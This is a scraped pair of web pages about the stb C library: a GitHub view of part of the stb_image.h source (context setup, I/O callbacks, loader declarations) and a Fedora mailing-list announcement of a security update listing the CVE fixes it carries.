#if defined(\_\_MINGW32\_\_) && defined(STBI\_\_X86\_TARGET) && !defined(STBI\_MINGW\_ENABLE\_SSE2) && !defined(STBI\_NO\_SIMD)// Note that \_\_MINGW32\_\_ doesn't actually mean 32-bit, so we have to avoid STBI\_\_X64\_TARGET//// 32-bit MinGW wants ESP to be 16-byte aligned, but this is not in the// Windows ABI and VC++ as well as Windows DLLs don't maintain that invariant.// As a result, enabling SSE2 on 32-bit MinGW is dangerous when not// simultaneously enabling "-mstackrealign".//// See https://github.com/nothings/stb/issues/81 for more information.//// So default to no SSE2 on 32-bit MinGW. If you've read this far and added// -mstackrealign to your build settings, feel free to #define STBI\_MINGW\_ENABLE\_SSE2.#define STBI\_NO\_SIMD#endif
#if !defined(STBI\_NO\_SIMD) && (defined(STBI\_\_X86\_TARGET) || defined(STBI\_\_X64\_TARGET))#define STBI\_SSE2#include <emmintrin.h>
#ifdef \_MSC\_VER
#if \_MSC\_VER >= 1400 // not VC6#include <intrin.h> // \_\_cpuidstatic int stbi\_\_cpuid3(void){ int info[4]; \_\_cpuid(info,1); return info[3];}#elsestatic int stbi\_\_cpuid3(void){ int res; \_\_asm { mov eax,1 cpuid mov res,edx } return res;}#endif
#define STBI\_SIMD\_ALIGN(type, name) \_\_declspec(align(16)) type name
#if !defined(STBI\_NO\_JPEG) && defined(STBI\_SSE2)static int stbi\_\_sse2\_available(void){ int info3 = stbi\_\_cpuid3(); return ((info3 >> 26) & 1) != 0;}#endif
#else // assume GCC-style if not VC++#define STBI\_SIMD\_ALIGN(type, name) type name \_\_attribute\_\_((aligned(16)))
#if !defined(STBI\_NO\_JPEG) && defined(STBI\_SSE2)static int stbi\_\_sse2\_available(void){ // If we're even attempting to compile this on GCC/Clang, that means // -msse2 is on, which means the compiler is allowed to use SSE2 // instructions at will, and so are we. return 1;}#endif
#endif#endif
// ARM NEON#if defined(STBI\_NO\_SIMD) && defined(STBI\_NEON)#undef STBI\_NEON#endif
#ifdef STBI\_NEON#include <arm\_neon.h>#ifdef \_MSC\_VER#define STBI\_SIMD\_ALIGN(type, name) \_\_declspec(align(16)) type name#else#define STBI\_SIMD\_ALIGN(type, name) type name \_\_attribute\_\_((aligned(16)))#endif#endif
#ifndef STBI\_SIMD\_ALIGN#define STBI\_SIMD\_ALIGN(type, name) type name#endif
#ifndef STBI\_MAX\_DIMENSIONS#define STBI\_MAX\_DIMENSIONS (1 << 24)#endif
/////////////////////////////////////////////////// stbi\_\_context struct and start\_xxx functions
// stbi\_\_context structure is our basic context used by all images, so it// contains all the IO context, plus some basic image informationtypedef struct{ stbi\_\_uint32 img\_x, img\_y; int img\_n, img\_out\_n;
 stbi\_io\_callbacks io; void \*io\_user\_data;
 int read\_from\_callbacks; int buflen; stbi\_uc buffer\_start[128]; int callback\_already\_read;
 stbi\_uc \*img\_buffer, \*img\_buffer\_end; stbi\_uc \*img\_buffer\_original, \*img\_buffer\_original\_end;} stbi\_\_context;
static void stbi\_\_refill\_buffer(stbi\_\_context \*s);
// initialize a memory-decode contextstatic void stbi\_\_start\_mem(stbi\_\_context \*s, stbi\_uc const \*buffer, int len){ s->io.read = NULL; s->read\_from\_callbacks = 0; s->callback\_already\_read = 0; s->img\_buffer = s->img\_buffer\_original = (stbi\_uc \*) buffer; s->img\_buffer\_end = s->img\_buffer\_original\_end = (stbi\_uc \*) buffer+len;}
// initialize a callback-based contextstatic void stbi\_\_start\_callbacks(stbi\_\_context \*s, stbi\_io\_callbacks \*c, void \*user){ s->io = \*c; s->io\_user\_data = user; s->buflen = sizeof(s->buffer\_start); s->read\_from\_callbacks = 1; s->callback\_already\_read = 0; s->img\_buffer = s->img\_buffer\_original = s->buffer\_start; stbi\_\_refill\_buffer(s); s->img\_buffer\_original\_end = s->img\_buffer\_end;}
#ifndef STBI\_NO\_STDIO
static int stbi\_\_stdio\_read(void \*user, char \*data, int size){ return (int) fread(data,1,size,(FILE\*) user);}
static void stbi\_\_stdio\_skip(void \*user, int n){ int ch; fseek((FILE\*) user, n, SEEK\_CUR); ch = fgetc((FILE\*) user); /\* have to read a byte to reset feof()'s flag \*/ if (ch != EOF) { ungetc(ch, (FILE \*) user); /\* push byte back onto stream if valid. \*/ }}
static int stbi\_\_stdio\_eof(void \*user){ return feof((FILE\*) user) || ferror((FILE \*) user);}
static stbi\_io\_callbacks stbi\_\_stdio\_callbacks ={ stbi\_\_stdio\_read, stbi\_\_stdio\_skip, stbi\_\_stdio\_eof,};
static void stbi\_\_start\_file(stbi\_\_context \*s, FILE \*f){ stbi\_\_start\_callbacks(s, &stbi\_\_stdio\_callbacks, (void \*) f);}
//static void stop\_file(stbi\_\_context \*s) { }
#endif // !STBI\_NO\_STDIO
static void stbi\_\_rewind(stbi\_\_context \*s){ // conceptually rewind SHOULD rewind to the beginning of the stream, // but we just rewind to the beginning of the initial buffer, because // we only use it after doing 'test', which only ever looks at at most 92 bytes s->img\_buffer = s->img\_buffer\_original; s->img\_buffer\_end = s->img\_buffer\_original\_end;}
enum{ STBI\_ORDER\_RGB, STBI\_ORDER\_BGR};
typedef struct{ int bits\_per\_channel; int num\_channels; int channel\_order;} stbi\_\_result\_info;
#ifndef STBI\_NO\_JPEGstatic int stbi\_\_jpeg\_test(stbi\_\_context \*s);static void \*stbi\_\_jpeg\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_jpeg\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PNGstatic int stbi\_\_png\_test(stbi\_\_context \*s);static void \*stbi\_\_png\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_png\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_png\_is16(stbi\_\_context \*s);#endif
#ifndef STBI\_NO\_BMPstatic int stbi\_\_bmp\_test(stbi\_\_context \*s);static void \*stbi\_\_bmp\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_bmp\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_TGAstatic int stbi\_\_tga\_test(stbi\_\_context \*s);static void \*stbi\_\_tga\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_tga\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PSDstatic int stbi\_\_psd\_test(stbi\_\_context \*s);static void \*stbi\_\_psd\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri, int bpc);static int stbi\_\_psd\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_psd\_is16(stbi\_\_context \*s);#endif
#ifndef STBI\_NO\_HDRstatic int stbi\_\_hdr\_test(stbi\_\_context \*s);static float \*stbi\_\_hdr\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_hdr\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PICstatic int stbi\_\_pic\_test(stbi\_\_context \*s);static void \*stbi\_\_pic\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_pic\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_GIFstatic int stbi\_\_gif\_test(stbi\_\_context \*s);static void \*stbi\_\_gif\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static void \*stbi\_\_load\_gif\_main(stbi\_\_context \*s, int \*\*delays, int \*x, int \*y, int \*z, int \*comp, int req\_comp);static int stbi\_\_gif\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);#endif
#ifndef STBI\_NO\_PNMstatic int stbi\_\_pnm\_test(stbi\_\_context \*s);static void \*stbi\_\_pnm\_load(stbi\_\_context \*s, int \*x, int \*y, int \*comp, int req\_comp, stbi\_\_result\_info \*ri);static int stbi\_\_pnm\_info(stbi\_\_context \*s, int \*x, int \*y, int \*comp);static int stbi\_\_pnm\_is16(stbi\_\_context \*s);#endif
static#ifdef STBI\_THREAD\_LOCALSTBI\_THREAD\_LOCAL#endifconst char \*stbi\_\_g\_failure\_reason;
STBIDEF const char \*stbi\_failure\_reason(void){ return stbi\_\_g\_failure\_reason;}
#ifndef STBI\_NO\_FAILURE\_STRINGSstatic int stbi\_\_err(const char \*str){ stbi\_\_g\_failure\_reason = str; return 0;}#endif
static void \*stbi\_\_malloc(size\_t size){ return STBI\_MALLOC(size);}
// stb\_image uses ints pervasively, including for offset calculations.// therefore the largest decoded image size we can support with the// current code, even on 64-bit targets, is INT\_MAX. this is not a// significant limitation for the intended use case.//// we do, however, need to make sure our size calculations don't// overflow. hence a few helper functions for size calculations that// multiply integers together, making sure that they're non-negative// and no overflow occurs.
// return 1 if the sum is valid, 0 on overflow.// negative terms are considered invalid.static int stbi\_\_addsizes\_valid(int a, int b)[View remainder of file in raw view](https://github.com/nothings/stb/raw/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from lists.fedoraproject.org_8054c7d4_20250111_100629.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN.mbox.gz?message=QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN/#QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN)

# [SECURITY] Fedora 37 Update: stb-0^20231011gitbeebb24-12.fc37

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

4 Nov
2023

4 Nov
'23

3:46 a.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2023-a93c06a1d9
2023-11-04 03:45:00.543203
--------------------------------------------------------------------------------

Name : stb
Product : Fedora 37
Version : 0^20231011gitbeebb24
Release : 12.fc37
URL : <https://github.com/nothings/stb>
Summary : Single-file public domain libraries for C/C++
Description :
Single-file public domain libraries for C/C++.

--------------------------------------------------------------------------------
Update Information:

Security fix for CVE-2023-45661 CVE-2023-45662 CVE-2023-45663 CVE-2023-45664
CVE-2023-45666 CVE-2023-45667 CVE-2023-45675 CVE-2023-43281
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-12
- stb\_vorbis: fix GHSL-2023-165 / fix CVE-2023-45675
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-11
- stb\_image: fix GHSL-2023-151 / fix CVE-2023-45667
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-10
- stb\_image: fix GHSL-2023-150 / fix CVE-2023-45666
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-9
- Document another bug, PR, and name (GHSL-2023-149) for CVE-2023-43898
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-8
- stb\_image: fix GHSL-2023-148 / fix CVE-2023-45664
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-7
- stb\_image: fix GHSL-2023-147 / fix CVE-2023-45663
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-6
- stb\_image: fix GHSL-2023-146 / fix CVE-2023-45662
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-5
- stb\_image: fix GHSL-2023-145 / fix CVE-2023-45661
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-4
- Document that 1454.patch fixes CVE-2023-43898
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-3
- Backport a PR fixing undefined behavior in stb\_image\_resize2
